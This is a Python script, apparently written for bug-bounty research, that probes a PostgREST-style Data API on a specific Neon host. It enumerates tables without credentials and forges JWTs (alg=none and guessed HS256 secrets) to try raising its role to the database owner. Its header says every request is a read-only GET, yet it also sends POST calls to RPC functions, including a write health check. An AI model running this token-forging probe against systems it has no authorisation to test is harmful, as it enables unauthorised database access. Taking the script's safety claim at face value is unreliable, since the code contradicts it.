# -*- coding: utf-8 -*-
"""Data API (SubZero/PostgREST) 技术面探测 - 全部只读 GET 零破坏
1) REST 根文档/健康
2) 匿名(无 token)能访问什么
3) JWT 行为:无 token/伪造 alg=none/假签名/HS256 任意 secret -> role claim 提权尝试
"""
import http.client, ssl, json, base64, hmac, hashlib, time

DA_HOST = 'ep-crimson-fog-w2gucld1.apirest.us-east-2.aws.neon.build'
BASE = '/neondb/rest/v1'
ctx = ssl.create_default_context()

def req(method, path, body=None, headers=None):
    conn = http.client.HTTPSConnection(DA_HOST, timeout=20)
    hdrs = {'Content-Type': 'application/json', 'Accept': 'application/json',
            'X-Bug-Bounty': 'xxbo'}
    if headers:
        hdrs.update(headers)
    conn.request(method, path, body=json.dumps(body) if body is not None else None, headers=hdrs)
    r = conn.getresponse()
    data = r.read().decode('utf-8', 'ignore')
    conn.close()
    return r.status, dict(r.getheaders()), data

def b64e(d):
    return base64.urlsafe_b64encode(d).rstrip(b'=').decode()

def make_jwt(header, payload, secret=None, alg='none'):
    h = b64e(json.dumps(header).encode())
    p = b64e(json.dumps(payload).encode())
    msg = (h + '.' + p).encode()
    if alg == 'none':
        return h + '.' + p + '.'
    sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
    return h + '.' + p + '.' + b64e(sig)

print('=== [1] REST 根 ===')
st, hdrs, body = req('GET', BASE + '/')
print('status=%s ct=%s' % (st, hdrs.get('content-type')))
print(body[:500])

print('\n=== [2] 匿名访问: 表枚举尝试 ===')
for t in ('health_check', 'lakebase_attributes', 'neon_migration', 'users', 'k_evt_log'):
    st, hdrs, body = req('GET', BASE + '/' + t + '?limit=1')
    print('  GET /%s -> %s %s' % (t, st, body[:150]))

print('\n=== [3] OpenAPI 文档 ===')
for p in ('/', '/openapi', '/swagger.json'):
    st, hdrs, body = req('GET', BASE + p, headers={'Accept': 'application/openapi+json'})
    print('  %s -> %s %s' % (p, st, body[:200]))

print('\n=== [4] JWT 行为矩阵(role claim 提权探测) ===')
now = int(time.time())
claims = [
    ('无 token(匿名)', None),
    ('alg=none role=authenticated', make_jwt({'alg': 'none', 'typ': 'JWT'}, {'role': 'authenticated', 'exp': now + 3600}, None, 'none')),
    ('alg=none role=neondb_owner', make_jwt({'alg': 'none', 'typ': 'JWT'}, {'role': 'neondb_owner', 'exp': now + 3600}, None, 'none')),
    ('HS256 假secret role=neondb_owner', make_jwt({'alg': 'HS256', 'typ': 'JWT'}, {'role': 'neondb_owner', 'exp': now + 3600}, 'secret', 'HS256')),
    ('HS256 secret=neondb_owner role=neondb_owner', make_jwt({'alg': 'HS256', 'typ': 'JWT'}, {'role': 'neondb_owner', 'exp': now + 3600}, 'neondb_owner', 'HS256')),
]
# 找一张可访问的表确认身份切换是否生效: public schema 里的对象
for tag, tok in claims:
    hdrs = {}
    if tok:
        hdrs['Authorization'] = 'Bearer ' + tok
    st, _, body = req('GET', BASE + '/', headers=hdrs)
    st2, _, body2 = req('GET', BASE + '/health_check?limit=1', headers=hdrs)
    print('  [%s] root=%s health_check=%s %s' % (tag, st, st2, body2[:120]))

print('\n=== [5] RPC/函数面(只读探测) ===')
# PostgREST rpc: POST /rpc/{fn}; 先探测哪些函数可调(只读函数无害)
for fn in ('health_check_write_succeeds', 'get_compute_primary_memory_bytes', 'approximate_working_set_size'):
    st, _, body = req('POST', BASE + '/rpc/' + fn, body={}, headers={'Content-Type': 'application/json'})
    print('  rpc %s -> %s %s' % (fn, st, body[:150]))
